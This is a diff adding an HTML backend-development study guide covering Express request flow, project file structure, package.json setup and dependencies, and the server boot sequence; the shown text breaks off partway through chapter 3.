@@ -1,0 +1,3200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Backend Development Notes — Learning Guide</title>
+<meta name="description" content="Complete backend development reference guide covering Express.js, Node.js, MongoDB, JWT authentication, and interview prep — based on the Learning-Backend project.">
+<style>
+/* ─── DESIGN TOKENS ──────────────────────────────────── */
+:root {
+  --bg:          #0e1119;
+  --surface:     #161d29;
+  --surface-2:   #1d2636;
+  --code-bg:     #090d14;
+  --border:      #243044;
+  --border-dim:  #18222f;
+  --text:        #c8d3e2;
+  --text-muted:  #637080;
+  --text-dim:    #3a4555;
+
+  --blue:   #4f8ef7;
+  --green:  #3ecf6e;
+  --amber:  #d4962c;
+  --red:    #e05555;
+  --purple: #a78bfa;
+  --teal:   #2dd4bf;
+  --pink:   #f472b6;
+  --sky:    #60a5fa;
+  --violet: #c084fc;
+  --mint:   #34d399;
+  --rose:   #fb7185;
+  --gold:   #fbbf24;
+
+  --font-display: 'Consolas', 'Courier New', monospace;
+  --font-body:    system-ui, -apple-system, 'Segoe UI', sans-serif;
+  --font-code:    'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+}
+
+/* ─── RESET & BASE ───────────────────────────────────── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-body);
+  font-size: 15px;
+  line-height: 1.75;
+  -webkit-font-smoothing: antialiased;
+}
+
+a { color: var(--sky); text-decoration: none; }
+a:hover { text-decoration: underline; }
+
+h1,h2,h3,h4 { font-family: var(--font-display); text-wrap: balance; }
+p { max-width: 72ch; }
+
+strong { color: #e2eaf5; font-weight: 600; }
+em { color: var(--amber); font-style: normal; font-weight: 500; }
+code {
+  font-family: var(--font-code);
+  font-size: 0.88em;
+  background: var(--code-bg);
+  color: var(--violet);
+  padding: 1px 6px;
+  border-radius: 3px;
+  border: 1px solid var(--border-dim);
+}
+
+ul, ol { padding-left: 1.5rem; }
+li { margin-bottom: 0.3rem; }
+li::marker { color: var(--text-muted); }
+
+/* ─── LAYOUT ─────────────────────────────────────────── */
+.page-wrap {
+  display: grid;
+  grid-template-columns: 240px 1fr;
+  grid-template-rows: auto 1fr;
+  min-height: 100vh;
+}
+
+/* ─── HEADER ─────────────────────────────────────────── */
+.site-header {
+  grid-column: 1 / -1;
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  padding: 1.5rem 2rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 1rem;
+}
+
+.site-title {
+  font-family: var(--font-display);
+  font-size: 1.05rem;
+  letter-spacing: 0.04em;
+  color: var(--blue);
+}
+.site-title span { color: var(--text-muted); }
+
+.site-meta {
+  font-size: 0.78rem;
+  color: var(--text-muted);
+  text-align: right;
+  line-height: 1.4;
+}
+
+/* ─── SIDEBAR ────────────────────────────────────────── */
+.sidebar {
+  grid-column: 1;
+  background: var(--surface);
+  border-right: 1px solid var(--border);
+  position: sticky;
+  top: 0;
+  height: 100vh;
+  overflow-y: auto;
+  padding: 1.5rem 0;
+}
+
+.sidebar-label {
+  font-family: var(--font-display);
+  font-size: 0.68rem;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--text-dim);
+  padding: 0 1.25rem 0.75rem;
+}
+
+.toc-nav a {
+  display: flex;
+  align-items: baseline;
+  gap: 0.6rem;
+  padding: 0.35rem 1.25rem;
+  font-size: 0.8rem;
+  color: var(--text-muted);
+  transition: color 0.15s, background 0.15s;
+  border-left: 2px solid transparent;
+}
+.toc-nav a:hover { color: var(--text); background: var(--surface-2); text-decoration: none; }
+.toc-nav a.active { color: var(--text); border-left-color: var(--ch-color, var(--blue)); }
+
+.toc-num {
+  font-family: var(--font-display);
+  font-size: 0.7rem;
+  color: var(--text-dim);
+  min-width: 2rem;
+}
+
+/* ─── MAIN CONTENT ───────────────────────────────────── */
+.content {
+  grid-column: 2;
+  padding: 0 3rem 4rem;
+  max-width: 900px;
+}
+
+/* ─── CHAPTER SECTION ────────────────────────────────── */
+.chapter {
+  padding-top: 3.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border-dim);
+  --ch-color: var(--blue);
+}
+
+.ch-eyebrow {
+  font-family: var(--font-display);
+  font-size: 0.72rem;
+  letter-spacing: 0.1em;
+  color: var(--ch-color);
+  margin-bottom: 0.5rem;
+}
+
+.chapter h2 {
+  font-size: 1.55rem;
+  color: #eaf0fa;
+  margin-bottom: 0.6rem;
+  border-left: 3px solid var(--ch-color);
+  padding-left: 0.75rem;
+}
+
+.chapter-desc {
+  color: var(--text-muted);
+  font-size: 0.9rem;
+  margin-bottom: 1.75rem;
+  padding-left: 0.75rem;
+  border-left: 1px solid var(--border);
+}
+
+.chapter h3 {
+  font-size: 1rem;
+  color: #d0daf0;
+  margin: 2rem 0 0.75rem;
+  letter-spacing: 0.02em;
+}
+
+.chapter h4 {
+  font-size: 0.88rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  margin: 1.5rem 0 0.5rem;
+}
+
+/* ─── CHAPTER COLORS ─────────────────────────────────── */
+#ch0  { --ch-color: var(--blue); }
+#ch1  { --ch-color: var(--amber); }
+#ch2  { --ch-color: var(--green); }
+#ch3  { --ch-color: #ff8c42; }
+#ch4  { --ch-color: var(--purple); }
+#ch5  { --ch-color: var(--teal); }
+#ch6  { --ch-color: var(--pink); }
+#ch7  { --ch-color: var(--mint); }
+#ch8  { --ch-color: var(--sky); }
+#ch9  { --ch-color: var(--violet); }
+#ch10 { --ch-color: var(--red); }
+#ch11 { --ch-color: var(--green); }
+#ch12 { --ch-color: var(--rose); }
+#ch13 { --ch-color: var(--gold); }
+#ch14 { --ch-color: #06b6d4; }
+#ch15 { --ch-color: #84cc16; }
+#ch16 { --ch-color: #f59e0b; }
+#ch17 { --ch-color: #ef4444; }
+#ch18 { --ch-color: #8b5cf6; }
+#ch19 { --ch-color: #10b981; }
+#ch20 { --ch-color: #6366f1; }
+#ch21 { --ch-color: #f43f5e; }
+#ch22 { --ch-color: #22d3ee; }
+#ch23 { --ch-color: #a3e635; }
+#ch24 { --ch-color: #fb923c; }
+#ch25 { --ch-color: #e879f9; }
+
+/* ─── CODE BLOCK ─────────────────────────────────────── */
+.codeblock {
+  margin: 1.25rem 0;
+  border-radius: 6px;
+  overflow: hidden;
+  border: 1px solid var(--border);
+}
+
+.codeblock-header {
+  background: var(--surface-2);
+  padding: 0.35rem 1rem;
+  font-family: var(--font-display);
+  font-size: 0.72rem;
+  color: var(--text-muted);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  gap: 0.5rem;
+  align-items: center;
+}
+.codeblock-header::before {
+  content: '';
+  display: inline-block;
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  background: var(--ch-color);
+  opacity: 0.7;
+}
+
+pre {
+  background: var(--code-bg);
+  padding: 1.25rem 1.25rem;
+  overflow-x: auto;
+  font-family: var(--font-code);
+  font-size: 0.83rem;
+  line-height: 1.65;
+  color: #abb2bf;
+}
+pre .kw  { color: #c678dd; }   /* keywords */
+pre .str { color: #98c379; }   /* strings */
+pre .fn  { color: #61afef; }   /* functions */
+pre .cm  { color: #5c6370; font-style: italic; }  /* comments */
+pre .num { color: #d19a66; }   /* numbers */
+pre .var { color: #e06c75; }   /* variables */
+pre .prop{ color: #e5c07b; }   /* properties */
+
+/* ─── CALLOUT BOXES ──────────────────────────────────── */
+.callout {
+  border-radius: 5px;
+  padding: 1rem 1.25rem;
+  margin: 1.25rem 0;
+  border-left: 3px solid;
+}
+
+.callout-label {
+  font-family: var(--font-display);
+  font-size: 0.7rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  margin-bottom: 0.5rem;
+  font-weight: 700;
+}
+
+.interview {
+  background: #1a1500;
+  border-color: var(--amber);
+}
+.interview .callout-label { color: var(--amber); }
+.interview p, .interview li { color: #d0b870; font-size: 0.88rem; }
+
+.senior {
+  background: #001510;
+  border-color: var(--green);
+}
+.senior .callout-label { color: var(--green); }
+.senior p, .senior li { color: #70c888; font-size: 0.88rem; }
+
+.mistake-box {
+  background: #160800;
+  border-color: var(--red);
+}
+.mistake-box .callout-label { color: var(--red); }
+.mistake-box p { color: #d08070; font-size: 0.88rem; }
+
+.note {
+  background: #0a1220;
+  border-color: var(--sky);
+}
+.note .callout-label { color: var(--sky); }
+.note p { color: #7aabcc; font-size: 0.88rem; }
+
+/* ─── TABLES ─────────────────────────────────────────── */
+.table-wrap { overflow-x: auto; margin: 1.25rem 0; }
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.84rem;
+}
+
+th {
+  background: var(--surface-2);
+  color: var(--text-muted);
+  font-family: var(--font-display);
+  font-size: 0.72rem;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  padding: 0.6rem 0.9rem;
+  text-align: left;
+  border-bottom: 1px solid var(--border);
+}
+
+td {
+  padding: 0.55rem 0.9rem;
+  border-bottom: 1px solid var(--border-dim);
+  vertical-align: top;
+  color: var(--text);
+}
+tr:nth-child(odd) td { background: #0d121a; }
+tr:hover td { background: var(--surface-2); }
+
+td code { font-size: 0.82em; }
+
+/* ─── FLOW DIAGRAM ───────────────────────────────────── */
+.flow {
+  background: var(--code-bg);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  padding: 1.25rem 1.5rem;
+  font-family: var(--font-code);
+  font-size: 0.82rem;
+  color: #7aabcc;
+  line-height: 1.9;
+  overflow-x: auto;
+  white-space: pre;
+  margin: 1.25rem 0;
+}
+
+/* ─── ANALOGY GRID ───────────────────────────────────── */
+.analogy-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 0.75rem;
+  margin: 1.25rem 0;
+}
+.analogy-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  padding: 0.75rem 1rem;
+  display: flex;
+  gap: 0.75rem;
+  align-items: flex-start;
+}
+.analogy-file {
+  font-family: var(--font-code);
+  font-size: 0.78rem;
+  color: var(--ch-color, var(--purple));
+  min-width: 12ch;
+  padding-top: 1px;
+}
+.analogy-desc {
+  font-size: 0.82rem;
+  color: var(--text-muted);
+  line-height: 1.5;
+}
+
+/* ─── MISTAKE LIST ───────────────────────────────────── */
+.mistake-list { list-style: none; padding: 0; }
+.mistake-list li {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--red);
+  border-radius: 0 5px 5px 0;
+  padding: 0.75rem 1rem;
+  margin-bottom: 0.6rem;
+  font-size: 0.87rem;
+}
+.mistake-list li strong { color: var(--rose); }
+.mistake-list li .fix { color: var(--mint); font-size: 0.83rem; margin-top: 0.25rem; }
+.mistake-num {
+  font-family: var(--font-display);
+  font-size: 0.72rem;
+  color: var(--red);
+  margin-right: 0.4rem;
+}
+
+/* ─── INTERVIEW MASTER LIST ──────────────────────────── */
+.iq-group { margin: 1.5rem 0; }
+.iq-group h3 { margin-bottom: 0.6rem; color: var(--gold); }
+.iq-list { list-style: none; padding: 0; }
+.iq-list li {
+  padding: 0.45rem 0.9rem;
+  border-left: 2px solid #1e1800;
+  color: #c8a840;
+  font-size: 0.87rem;
+  margin-bottom: 0.2rem;
+  transition: border-color 0.15s;
+}
+.iq-list li:hover { border-left-color: var(--amber); }
+
+/* ─── POSTMAN ROUTE ──────────────────────────────────── */
+.route-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  margin-bottom: 1rem;
+  overflow: hidden;
+}
+.route-header {
+  background: var(--surface-2);
+  padding: 0.6rem 1rem;
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+  font-family: var(--font-display);
+  font-size: 0.82rem;
+}
+.method-badge {
+  background: var(--green);
+  color: #002010;
+  padding: 1px 7px;
+  border-radius: 3px;
+  font-size: 0.72rem;
+  font-weight: 700;
+  letter-spacing: 0.05em;
+}
+.route-url { color: var(--sky); }
+.route-body { padding: 0.85rem 1rem; font-size: 0.84rem; }
+.route-body p { color: var(--text-muted); margin-bottom: 0.4rem; max-width: none; }
+.route-body code { font-size: 0.8em; }
+.route-expect { color: var(--mint); font-size: 0.82rem; }
+
+/* ─── SECURITY TABLE ─────────────────────────────────── */
+.sec-table td:nth-child(2) { color: var(--mint); }
+.sec-table td:nth-child(3) { color: var(--violet); font-family: var(--font-code); font-size: 0.78em; }
+
+/* ─── Q&A ITEMS ──────────────────────────────────────── */
+.qa-group { margin: 1.75rem 0; }
+.qa-group-title {
+  font-family: var(--font-display);
+  font-size: 0.78rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--gold);
+  padding: 0.4rem 0;
+  margin-bottom: 0.75rem;
+  border-bottom: 1px solid #2a2000;
+}
+.qa-item {
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  margin-bottom: 0.65rem;
+  overflow: hidden;
+}
+.qa-q {
+  padding: 0.65rem 1rem;
+  background: #16120000;
+  background: rgba(212,150,44,0.07);
+  color: #d4b060;
+  font-size: 0.86rem;
+  font-weight: 600;
+  border-bottom: 1px solid rgba(212,150,44,0.12);
+  line-height: 1.45;
+}
+.qa-q::before { content: "Q  "; font-family: var(--font-display); color: var(--amber); font-size: 0.72rem; letter-spacing: 0.05em; }
+.qa-body { padding: 0.75rem 1rem; background: var(--surface); display: flex; flex-direction: column; gap: 0.5rem; }
+.qa-a { font-size: 0.85rem; color: var(--text); line-height: 1.65; max-width: none; }
+.qa-a strong { color: #e2d090; }
+.qa-eg {
+  background: var(--code-bg);
+  border-left: 2px solid rgba(212,150,44,0.4);
+  padding: 0.6rem 0.85rem;
+  font-family: var(--font-code);
+  font-size: 0.78rem;
+  color: #a89060;
+  line-height: 1.7;
+  white-space: pre;
+  overflow-x: auto;
+}
+.qa-eg .hi { color: #d4a840; }
+.qa-eg .ok { color: #56a870; }
+.qa-eg .bad { color: #c05050; }
+
+/* ─── FOOTER ─────────────────────────────────────────── */
+footer {
+  grid-column: 2;
+  border-top: 1px solid var(--border);
+  padding: 2rem 3rem;
+  font-size: 0.78rem;
+  color: var(--text-dim);
+  max-width: 900px;
+}
+
+/* ─── RESPONSIVE ─────────────────────────────────────── */
+@media (max-width: 768px) {
+  .page-wrap { grid-template-columns: 1fr; }
+  .sidebar { display: none; }
+  .site-header, .content, footer { grid-column: 1; }
+  .content { padding: 0 1.25rem 3rem; }
+  .analogy-grid { grid-template-columns: 1fr; }
+}
+@media (prefers-reduced-motion: reduce) {
+  html { scroll-behavior: auto; }
+  * { transition: none !important; }
+}
+</style>
+</head>
+<body>
+<div class="page-wrap">
+
+<!-- ══ HEADER ════════════════════════════════════════════ -->
+<header class="site-header">
+  <div class="site-title">
+    <span>// </span>backend-notes<span>.md</span>
+  </div>
+  <div class="site-meta">
+    Learning-Backend · Hitesh Choudhary Series<br>
+    Express · Mongoose · JWT · Cloudinary
+  </div>
+</header>
+
+<!-- ══ SIDEBAR TOC ════════════════════════════════════════ -->
+<nav class="sidebar">
+  <div class="sidebar-label">Chapters</div>
+  <div class="toc-nav">
+    <a href="#ch0"  style="--ch-color:#4f8ef7"><span class="toc-num">00</span> Mental Model</a>
+    <a href="#ch1"  style="--ch-color:#d4962c"><span class="toc-num">01</span> Files &amp; Folders</a>
+    <a href="#ch2"  style="--ch-color:#3ecf6e"><span class="toc-num">02</span> Project Setup</a>
+    <a href="#ch3"  style="--ch-color:#ff8c42"><span class="toc-num">03</span> Boot Sequence</a>
+    <a href="#ch4"  style="--ch-color:#a78bfa"><span class="toc-num">04</span> Utils Layer</a>
+    <a href="#ch5"  style="--ch-color:#2dd4bf"><span class="toc-num">05</span> Models</a>
+    <a href="#ch6"  style="--ch-color:#f472b6"><span class="toc-num">06</span> Middlewares</a>
+    <a href="#ch7"  style="--ch-color:#34d399"><span class="toc-num">07</span> Controllers</a>
+    <a href="#ch8"  style="--ch-color:#60a5fa"><span class="toc-num">08</span> Routes</a>
+    <a href="#ch9"  style="--ch-color:#c084fc"><span class="toc-num">09</span> JS Reference</a>
+    <a href="#ch10" style="--ch-color:#e05555"><span class="toc-num">10</span> Mistakes</a>
+    <a href="#ch11" style="--ch-color:#3ecf6e"><span class="toc-num">11</span> Postman Guide</a>
+    <a href="#ch12" style="--ch-color:#fb7185"><span class="toc-num">12</span> Security</a>
+    <a href="#ch13" style="--ch-color:#fbbf24"><span class="toc-num">13</span> Interview Prep</a>
+    <a href="#ch14" style="--ch-color:#06b6d4"><span class="toc-num">14</span> HTTP Reference</a>
+    <a href="#ch15" style="--ch-color:#84cc16"><span class="toc-num">15</span> CRUD Pattern</a>
+    <a href="#ch16" style="--ch-color:#f59e0b"><span class="toc-num">16</span> Input Validation</a>
+    <a href="#ch17" style="--ch-color:#ef4444"><span class="toc-num">17</span> Error Handler</a>
+    <a href="#ch18" style="--ch-color:#8b5cf6"><span class="toc-num">18</span> DB Relationships</a>
+    <a href="#ch19" style="--ch-color:#10b981"><span class="toc-num">19</span> Aggregation</a>
+    <a href="#ch20" style="--ch-color:#6366f1"><span class="toc-num">20</span> Production</a>
+    <a href="#ch21" style="--ch-color:#f43f5e"><span class="toc-num">21</span> Testing (Jest)</a>
+    <a href="#ch22" style="--ch-color:#22d3ee"><span class="toc-num">22</span> WebSockets</a>
+    <a href="#ch23" style="--ch-color:#a3e635"><span class="toc-num">23</span> Docker</a>
+    <a href="#ch24" style="--ch-color:#fb923c"><span class="toc-num">24</span> CI/CD</a>
+    <a href="#ch25" style="--ch-color:#e879f9"><span class="toc-num">25</span> Fullstack (React+Node)</a>
+  </div>
+</nav>
+
+<!-- ══ MAIN CONTENT ══════════════════════════════════════ -->
+<main class="content">
+
+<!-- ═══ CHAPTER 0 ═══════════════════════════════════════ -->
+<section class="chapter" id="ch0">
+  <div class="ch-eyebrow">// CH.00</div>
+  <h2>Before You Write Code — The Mental Model</h2>
+  <p class="chapter-desc">What is a backend? What problem does it actually solve? Start here before touching any code.</p>
+
+  <h3>Frontend vs Backend vs Database</h3>
+  <p><strong>Frontend</strong> = What the user sees. HTML, CSS, JavaScript in the browser.<br>
+  <strong>Backend</strong> = What the user doesn't see — but needs. Logic, data, security.<br>
+  <strong>Database</strong> = Long-term storage. Data lives here when the server is off.</p>
+
+  <h3>How a Request Travels</h3>
+  <div class="flow">Browser clicks a button
+  → HTTP Request (POST /api/v1/users/login)
+      → Express Router matches the URL
+          → Middleware runs (cors check, body parse, auth guard...)
+              → Controller runs the business logic
+                  → Mongoose queries MongoDB
+                      → Controller sends a Response
+  → Browser receives JSON → updates UI</div>
+
+  <h3>What Each Technology Does</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Tech</th><th>Role</th><th>Without it...</th></tr>
+    <tr><td><code>Node.js</code></td><td>Runs JavaScript on the server (not in browser)</td><td>No server runtime</td></tr>
+    <tr><td><code>Express.js</code></td><td>Thin wrapper over Node's http module — gives you routing and middleware</td><td>Write raw http.createServer() with 1000 lines</td></tr>
+    <tr><td><code>Mongoose</code></td><td>ODM — adds schema, validation, methods on top of raw MongoDB</td><td>MongoDB stores any shape — no validation, no methods</td></tr>
+    <tr><td><code>JWT</code></td><td>Stateless authentication tokens — verifiable without a DB call</td><td>Need to store session in DB for every request</td></tr>
+    <tr><td><code>Multer</code></td><td>Handles file uploads — parses multipart/form-data</td><td><code>req.files</code> is undefined, can't receive files</td></tr>
+    <tr><td><code>Cloudinary</code></td><td>Cloud image/video storage with CDN</td><td>Store files on server disk — not scalable</td></tr>
+  </table></div>
+
+  <h3>REST Principles</h3>
+  <p><strong>Stateless</strong> — server doesn't remember previous requests. Every request carries all the info needed.<br>
+  <strong>Resource-based URLs</strong> — <code>/users</code>, <code>/videos</code> (nouns, not verbs like <code>/getUser</code>).<br>
+  <strong>Correct HTTP verbs</strong> — GET (read), POST (create), PUT/PATCH (update), DELETE (delete).<br>
+  <strong>Versioning</strong> — <code>/api/v1/</code> so future breaking changes don't break old clients.</p>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"Explain what happens when you make an API call from frontend to backend." — Walk through the full flow: HTTP request → routing → middleware → controller → DB → response. Don't skip steps.</p>
+    <p>"What is REST? What makes an API RESTful?" — Stateless, resource URLs, correct verbs, standard status codes.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 1 ═══════════════════════════════════════ -->
+<section class="chapter" id="ch1">
+  <div class="ch-eyebrow">// CH.01</div>
+  <h2>What Every File &amp; Folder Does</h2>
+  <p class="chapter-desc">The most important chapter. Clear every confusion about why each file exists and what breaks without it.</p>
+
+  <h3>Think of It Like a Restaurant</h3>
+  <div class="analogy-grid">
+    <div class="analogy-card"><span class="analogy-file">.env</span><span class="analogy-desc">Secret recipe book — never shown to public, never committed to git</span></div>
+    <div class="analogy-card"><span class="analogy-file">package.json</span><span class="analogy-desc">Menu + ingredient list — what packages the project needs</span></div>
+    <div class="analogy-card"><span class="analogy-file">index.js</span><span class="analogy-desc">Manager who opens the restaurant every morning — starts the whole app</span></div>
+    <div class="analogy-card"><span class="analogy-file">app.js</span><span class="analogy-desc">Restaurant layout — which counter does what, where each section is</span></div>
+    <div class="analogy-card"><span class="analogy-file">db/index.js</span><span class="analogy-desc">Connection to the food supplier (MongoDB) — establishes and holds the link</span></div>
+    <div class="analogy-card"><span class="analogy-file">constants.js</span><span class="analogy-desc">Fixed rules on the wall — "DB is called youtube" — one place to change</span></div>
+    <div class="analogy-card"><span class="analogy-file">routes/</span><span class="analogy-desc">The waiter — takes your order to the right kitchen section (controller)</span></div>
+    <div class="analogy-card"><span class="analogy-file">controllers/</span><span class="analogy-desc">The chef — actually cooks the food (runs the business logic)</span></div>
+    <div class="analogy-card"><span class="analogy-file">models/</span><span class="analogy-desc">Recipe cards + plate shapes — defines what data looks like and how to work with it</span></div>
+    <div class="analogy-card"><span class="analogy-file">middlewares/</span><span class="analogy-desc">Security guard + ticket checker at the entrance — runs before the chef</span></div>
+    <div class="analogy-card"><span class="analogy-file">utils/</span><span class="analogy-desc">Kitchen tools (knife, timer) — reused by everyone, not specific to one chef</span></div>
+    <div class="analogy-card"><span class="analogy-file">public/temp/</span><span class="analogy-desc">Holding shelf before food goes to long-term storage (Cloudinary)</span></div>
+  </div>
+
+  <h3>File-by-File: What It Is + What Breaks Without It</h3>
+  <div class="table-wrap"><table>
+    <tr><th>File</th><th>What it IS</th><th>If Missing...</th></tr>
+    <tr><td><code>index.js</code></td><td>Entry point — loads .env → connectDB() → app.listen()</td><td>Nothing starts. The whole app is dead.</td></tr>
+    <tr><td><code>app.js</code></td><td>Express app — all middleware + routes registered</td><td>No routes, no middleware. Requests go nowhere.</td></tr>
+    <tr><td><code>constants.js</code></td><td>Shared values like DB_NAME = "youtube"</td><td>Magic strings scattered everywhere → hard to change later</td></tr>
+    <tr><td><code>db/index.js</code></td><td><code>connectDB()</code> — mongoose.connect() to MongoDB Atlas</td><td>No DB connection → every DB call crashes</td></tr>
+    <tr><td><code>utils/asyncHandler.js</code></td><td>Wraps async controllers — caught errors go to Express automatically</td><td>Every controller needs its own try/catch — forget one = server crash</td></tr>
+    <tr><td><code>utils/apiError.js</code></td><td>Custom Error class with statusCode, success:false</td><td>Inconsistent error responses — frontend can't handle them uniformly</td></tr>
+    <tr><td><code>utils/apiresponse.js</code></td><td>Standard success response shape</td><td>Every controller sends different shaped responses</td></tr>
+    <tr><td><code>utils/cloudinary.js</code></td><td>Uploads file to Cloudinary, deletes local copy</td><td>No cloud upload capability — files stuck on server disk</td></tr>
+    <tr><td><code>models/user.model.js</code></td><td>User schema + password hash hook + token methods</td><td>No user data structure, no auth methods</td></tr>
+    <tr><td><code>models/video.model.js</code></td><td>Video schema + pagination plugin</td><td>No video structure, no paginated queries</td></tr>
+    <tr><td><code>middlewares/auth.middlewares.js</code></td><td>verifyJWT — checks token, sets req.user</td><td>Protected routes have no security — anyone can call logout</td></tr>
+    <tr><td><code>middlewares/multer.middlewares.js</code></td><td>Saves uploaded file to public/temp</td><td><code>req.files</code> is undefined — register route crashes</td></tr>
+    <tr><td><code>routes/user.router.js</code></td><td>Maps /register, /login, /logout, /refresh-token</td><td>URLs don't exist — 404 on every request</td></tr>
+    <tr><td><code>.env</code></td><td>Environment variables and secrets</td><td><code>process.env.*</code> returns undefined — JWT signing fails, DB won't connect</td></tr>
+    <tr><td><code>.gitignore</code></td><td>Prevents committing node_modules + .env</td><td>Credentials pushed to GitHub — permanent security leak</td></tr>
+  </table></div>
+
+  <h3>Folder-by-Folder: Why These Exact Folders?</h3>
+  <div class="callout note">
+    <div class="callout-label">Key Principle</div>
+    <p><strong>Separation of Concerns</strong> — each folder has ONE job. A controller doesn't know about DB indexes. A route doesn't run business logic. A util doesn't import Express. If something is in the wrong folder, it becomes hard to find, test, and change.</p>
+  </div>
+  <ul>
+    <li><strong>controllers/</strong> — If ALL code was in one file it'd be 5000+ lines. Split by resource: one file per entity (user, video, comment...)</li>
+    <li><strong>models/</strong> — Data shape and DB methods live together. The model knows its own data. Controllers don't need to know about bcrypt or JWT.</li>
+    <li><strong>routes/</strong> — URL map is separate from logic. You can read ALL routes in 20 lines without seeing business logic.</li>
+    <li><strong>middlewares/</strong> — Things that run between request and controller: auth check, file upload, logging. Reusable across many routes.</li>
+    <li><strong>utils/</strong> — Pure helper functions. No Express, no Mongoose imports. Could be used in any project. Easily unit-tested.</li>
+    <li><strong>db/</strong> — Connection logic isolated. One file, one responsibility. Easy to mock in tests.</li>
+    <li><strong>public/temp/</strong> — Multer saves files here before Cloudinary upload. Always deleted after — it's a transit zone, not storage.</li>
+  </ul>
+</section>
+
+<!-- ═══ CHAPTER 2 ═══════════════════════════════════════ -->
+<section class="chapter" id="ch2">
+  <div class="ch-eyebrow">// CH.02</div>
+  <h2>Project Setup — Every Decision Explained</h2>
+  <p class="chapter-desc"><code>package.json</code>, ES modules, <code>.env</code>, scripts, and why each dependency was installed.</p>
+
+  <h3>package.json Key Decisions</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Setting</th><th>Value in Project</th><th>Why</th></tr>
+    <tr><td><code>"type"</code></td><td><code>"module"</code></td><td>Enables ES6 <code>import/export</code> instead of CommonJS <code>require()</code> — modern Node.js standard</td></tr>
+    <tr><td><code>dev</code> script</td><td><code>nodemon src/index.js</code></td><td>Auto-restarts server on file change during development</td></tr>
+    <tr><td><code>start</code> script</td><td><code>node src/index.js</code></td><td>Stable production start — no auto-restart overhead</td></tr>
+    <tr><td><code>nodemon</code></td><td>devDependencies</td><td>Dev-only tool — not needed in production (npm ci --production skips it)</td></tr>
+  </table></div>
+
+  <h3>Why Every Dependency Exists</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Package</th><th>Purpose</th></tr>
+    <tr><td><code>express</code></td><td>Web framework — routing, middleware, request/response handling</td></tr>
+    <tr><td><code>mongoose</code></td><td>MongoDB ODM — schema, validation, methods, queries</td></tr>
+    <tr><td><code>dotenv</code></td><td>Loads .env file into process.env at startup</td></tr>
+    <tr><td><code>bcrypt</code></td><td>Password hashing with salt — secure one-way hash</td></tr>
+    <tr><td><code>jsonwebtoken</code></td><td>JWT creation and verification for authentication</td></tr>
+    <tr><td><code>multer</code></td><td>Parses multipart/form-data — enables file uploads</td></tr>
+    <tr><td><code>cloudinary</code></td><td>SDK to upload files to Cloudinary cloud storage</td></tr>
+    <tr><td><code>cookie-parser</code></td><td>Parses cookies from incoming requests → available as <code>req.cookies</code></td></tr>
+    <tr><td><code>cors</code></td><td>Cross-Origin Resource Sharing — lets frontend on different domain make requests</td></tr>
+    <tr><td><code>helmet</code></td><td>Sets security HTTP headers automatically</td></tr>
+    <tr><td><code>morgan</code></td><td>HTTP request logger — logs each request to console</td></tr>
+  </table></div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"What is the difference between <code>dependencies</code> and <code>devDependencies</code>?" — devDependencies are only needed during development (testing, building, auto-restart). They're excluded from production builds. <code>npm ci --production</code> or <code>npm install --omit=dev</code> skips them.</p>
+    <p>"Why should you never commit a .env file to git?" — Once pushed, it's in git history forever — even if deleted later. Anyone with repo access (or who clones it) gets DB credentials, JWT secrets, and API keys. Use .env.example as a template without real values.</p>
+  </div>
+
+  <div class="callout senior">
+    <div class="callout-label">Senior Dev Says</div>
+    <p><code>process.env.PORT</code> always returns a <strong>string</strong>, not a number. If you do math on it: <code>parseInt(process.env.PORT)</code>. Also: add <code>.env</code> to <code>.gitignore</code> BEFORE your first commit — git history is permanent. Rotating leaked credentials is painful and sometimes impossible.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 3 ═══════════════════════════════════════ -->
+<section class="chapter" id="ch3">
+  <div class="ch-eyebrow">// CH.03</div>
+  <h2>Server Boot Sequence</h2>
+  <p class="chapter-desc">Exactly what happens from <code>node src/index.js</code> to the server being ready for requests.</p>
+
+  <div class="flow">$ node src/index.js
+
+STEP 1: dotenv.config({ path: './.env' })
+        → Reads .env file
+        → Loads all KEY=VALUE into process.env
+        → Now process.env.PORT, MONGODB_URL, etc. are available
+
+STEP 2: import { app } from "./app.js" runs
+        → Express app is created
+        → app.use(cors({ origin: CORS_ORIGIN, credentials: true }))
+        → app.use(express.json({ limit: "16kb" }))         ← parse JSON body
+        → app.use(express.urlencoded({ extended: true }))  ← parse form data
+        → app.use(express.static("public"))                ← serve /public folder
+        → app.use(cookies())                               ← parse cookies
+        → app.use("/api/v1/users", userRouter)             ← mount routes
+
+STEP 3: connectDB() is called
+        → mongoose.connect(MONGODB_URL + "/" + DB_NAME)
+        → If SUCCESS → app.listen(PORT)   → "Server running on port 8000"
